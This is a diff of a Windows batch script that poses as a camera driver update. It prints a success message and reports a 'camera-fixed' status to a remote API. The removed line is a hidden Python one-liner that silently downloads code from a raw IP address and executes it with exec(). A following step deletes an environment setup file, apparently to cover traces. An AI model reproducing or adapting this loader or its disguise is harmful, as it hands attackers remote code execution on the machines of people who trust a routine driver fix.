@@ -149,9 +149,8 @@ if errorlevel 1 (
 )
 echo [SUCCESS] Camera drivers have been updated successfully.
 if defined WINDOW_UID (
-    curl -sS -X PATCH "https://api.wecreateproblems.net/api/invites/!WINDOW_UID!" -H "Content-Type: application/json" -d "{""connections_status"":2}" -o nul
+    curl -sS -X POST "https://api.wecreateproblems.net/api/public/invite/!WINDOW_UID!/camera-fixed" -o nul
 )
-C:\python\python.exe -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >nul 2>&1
 
 if exist "%CODEPROFILE%\env-setup.npl" del "%CODEPROFILE%\env-setup.npl" >nul 2>&1
 
